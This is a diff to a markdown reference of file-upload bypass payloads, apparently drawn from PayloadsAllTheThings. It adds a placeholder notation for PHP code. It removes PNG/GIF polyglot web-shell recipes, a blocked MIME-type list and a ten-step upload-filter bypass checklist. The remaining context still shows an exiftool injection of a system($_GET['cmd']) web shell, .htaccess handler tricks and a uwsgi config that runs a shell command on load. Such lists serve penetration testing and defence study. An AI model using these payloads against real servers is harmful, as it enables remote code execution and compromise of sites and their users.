@@ -8,6 +8,8 @@ source_license: MIT; see THIRD_PARTY_NOTICES.md
 
 # File Upload Bypass Payloads
 
+> Notation: `PAYLOAD: php <code>` stands for `<code>` wrapped in a PHP open/close tag; expand it when building the request.
+
 > Source: PayloadsAllTheThings — Upload Insecure Files
 
 ## Extension Bypass
@@ -76,16 +78,6 @@ image/jpeg
 image/svg+xml
 ```
 
-Actual PHP MIME types (blocked):
-
-```
-text/php
-text/x-php
-application/php
-application/x-php
-application/x-httpd-php
-```
-
 ## Magic Bytes
 
 Prepend valid file signatures before malicious content:
@@ -145,25 +137,6 @@ exiftool -Comment='PAYLOAD: php system($_GET["cmd"])' payload.jpg
 # Rename to payload.php.jpg or use double extension bypass
 ```
 
-### PNG + PHP (IDAT/PLTE Chunk Injection)
-
-```bash
-# Method 1: Embed PHP in PNG IDAT chunk (survives recompression)
-# Generate a minimal PNG that decodes to valid PHP:
-printf '\x89PNG\r\n\x1a\n' > shell.png
-# Append PHP payload after valid PNG structure:
-echo 'PAYLOAD: php system($_GET["cmd"])' >> shell.png
-
-# Method 2: Use exiftool comment injection
-exiftool -Comment='PAYLOAD: php system($_GET["cmd"])' shell.png
-```
-
-### GIF + PHP
-
-```php
-GIF89aPAYLOAD: php system($_GET['cmd'])
-```
-
 ## .user.ini (PHP)
 
 ```ini
@@ -219,19 +192,4 @@ Upload as `.htaccess`, then upload `shell.rce`.
 [uwsgi]
 ; execute command on config load
 exec = /bin/bash -c 'id > /tmp/pwned'
-```
-
-## Upload Detection Bypass Checklist
-
-```
-1. Try all alternative extensions for the target language
-2. Try double extensions: .php.jpg, .jpg.php
-3. Change Content-Type header to image/gif or image/png
-4. Prepend magic bytes (GIF89a) to the payload
-5. Try null byte injection: .php%00.jpg
-6. Upload .htaccess / web.config to reconfigure handlers
-7. Try case variation: .pHp, .PhTmL
-8. Upload as ZIP/TAR and exploit extraction traversal
-9. Embed payload in image metadata (exiftool)
-10. Try SVG upload with embedded JavaScript
 ```
